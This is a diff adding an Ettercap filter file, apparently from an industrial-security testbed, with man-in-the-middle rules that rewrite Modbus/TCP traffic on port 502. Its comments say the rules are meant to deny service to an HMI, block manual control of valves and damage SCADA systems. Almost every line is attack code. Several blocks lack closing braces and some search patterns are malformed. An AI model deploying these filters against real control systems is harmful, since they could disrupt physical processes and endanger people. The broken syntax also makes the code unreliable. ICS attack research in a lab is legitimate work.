@@ -1,0 +1,57 @@
+# After desiging the following filers, read "Tools for designing attack scenarios" to understand how to make these 
+# filter compatible to Ettercap
+
+
+# Inject a malicious function code in response to a query of function code 02 (Read discrete Input). 
+if(ip.proto == TCP && tcp.dst == 502) {
+                   if (search(DATA.data, "x02")) {
+                   msg("Function code 2");
+                   replace("\x02", "\x07");
+
+
+# Inject a malicious function code in response to a query of function code 04 (Read Input register), This filter DoS HMI
+if(ip.proto == TCP && tcp.dst == 502) {
+                   if (search(DATA.data, "x04")) {
+                   msg("Function code 4");
+                   replace("\x04", "\x03");
+                   
+                   
+                   
+# Inject a malicious function code in response to a query of function code 16 (Write multiple register)
+# This injection stops manual opening and closing of control valves  
+if(ip.proto == TCP && tcp.dst == 502) {
+                   if (search(DATA.data, "x10")) {
+                   msg("Function code 16");
+                   replace("\x10", "\x01");
+
+
+# Inject a malicious value to change the packet length. 
+# This type of response injections stops modbus packet exchange (DoS Modbus)
+if(tcp.dst == 502 && DATA.data + 5 == "\x08") {
+                    msg("Packet length match");
+                    DATA.data + 5 = 1;
+                    
+                    
+# Inject a malicious value to change the Transaction Identifier. It causes damage in large scada system (Not in our testbed)  
+if(tcp.dst == 502 && DATA.data + 1 == "\x00") {
+                    msg("Transaction Identifier match");
+                    DATA.data + 1 = 1;
+                    
+                    
+# Inject a malicious value to change the Unit identifier. It causes damage in large scada system (Not in our testbed)
+if(tcp.dst == 502 && DATA.data + 6 == "\x01") {
+                    msg("Unit identifier match");
+                    DATA.data + 6 = 2;
+                    
+                    
+# This is a another method of injecting maliciuos function code.
+if(tcp.dst == 502 && DATA.data + 7 == "\x04") {
+                    msg("Function code 4");
+                    DATA.data + 7 = 0;
+                    
+                    
+ # This filter changes reference number in a query of function code 16. This one stops manual opening and closing of control valves                 
+ if(tcp.dst == 502 && DATA.data + 9 == "\x00") {
+                    msg("Reference Number match");
+                    DATA.data + 9 = 1;
+              
